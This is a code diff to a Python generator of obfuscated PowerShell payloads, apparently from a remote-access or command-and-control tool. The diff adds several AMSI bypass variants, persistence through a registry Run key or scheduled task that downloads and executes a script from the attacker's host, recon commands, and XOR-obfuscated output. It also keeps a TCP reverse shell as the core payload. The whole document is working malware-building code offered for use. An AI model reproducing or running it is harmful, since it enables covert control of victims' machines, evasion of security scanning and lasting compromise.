@@ -18,17 +18,72 @@ def junk_code():
     ]
     return random.choice(j) + "\n"
 
-def amsi_bypass_block(var):
-    # Only field name is obfuscated for reliability
-    field = '+'.join([f"'{c}'" for c in "amsiInitFailed"])
-    return (
-        f"${var['amsi_type']} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
-        f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField({field},'NonPublic,Static')\n"
-        f"${var['amsi_field']}.SetValue($null,$true)\n"
-    )
-def generate_obfuscated_ps(host="YOUR_SERVER_IP", port=1443, write_file=True):
+def get_amsi_bypass(method="redundant"):
+    if method == "basic":
+        return "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
+    elif method == "redundant":
+        return """
+try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
+try{$w=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$w.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)}catch{}
+"""
+    else:  # advanced (currently same as redundant for stability)
+        return """
+try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(('amsi'+'Init'+'Failed'),'NonPublic,Static').SetValue($null,$true)}catch{}
+"""
+
+def get_persistence(method, host, port):
+    if method == "registry":
+        return f"""
+New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{rand_name()}' -Value 'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\\\"http://{host}:{port}/payload.ps1\\\")"' -Force;
+"""
+    elif method == "schtasks":
+        return f"""
+schtasks /create /sc minute /mo 30 /tn "{rand_name()}" /tr "powershell.exe -nop -w hidden -c 'IEX(New-Object Net.WebClient).DownloadString(\\\"http://{host}:{port}/payload.ps1\\\")'" /F;
+"""
+    else:
+        return ""
+
+def get_recon_commands():
+    return """
+$recon = systeminfo; $recon += whoami /all; $recon += ipconfig /all;
+"""
+
+def xor_wrapper():
+    return """
+function XOR($data,$key=0x5A){
+    [byte[]]$b=[System.Text.Encoding]::ASCII.GetBytes($data);
+    for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $key};
+    return [System.Text.Encoding]::ASCII.GetString($b);
+}
+"""
+
+def generate_obfuscated_ps(
+    host="localhost",
+    port=1443,
+    amsi_bypass="redundant",
+    persistence="none",
+    auto_recon=False,
+    xor_encrypt=False,
+    write_file=True
+):
+    parts = []
+
+    # AMSI bypass
+    parts.append(get_amsi_bypass(amsi_bypass))
+
+    # Persistence (optional)
+    if persistence != "none":
+        parts.append(get_persistence(persistence, host, port))
+
+    # XOR function (optional)
+    if xor_encrypt:
+        parts.append(xor_wrapper())
+
+    # Recon (optional)
+    recon_cmd = get_recon_commands() if auto_recon else ""
+
+    # Core shell (proven good!)
     core_shell = f"""
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
 $client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{{0}};
@@ -40,23 +95,31 @@ while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{
         $result = $_.Exception.Message;
     }}
     $result += 'PS ' + (pwd).Path + '> ';
+    {( "$result = XOR($result);" if xor_encrypt else "" )}
     $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($result);
     $stream.Write($sendbyte,0,$sendbyte.Length);
     $stream.Flush();
 }}
 """
+
+    # Add optional recon
+    if recon_cmd:
+        core_shell = recon_cmd + core_shell
+
+    parts.append(core_shell)
+
+    payload_final = "\n".join(parts)
+
     if write_file:
         folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
         os.makedirs(folder, exist_ok=True)
         filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
         path = os.path.join(folder, filename)
         with open(path, 'w') as f:
-            f.write(core_shell)
+            f.write(payload_final)
         return filename
     else:
-        return core_shell
+        return payload_final
 
-
-
-# Alias for your other code
+# Alias (preserve existing calls)
 generate_polymorphic_ps = generate_obfuscated_ps
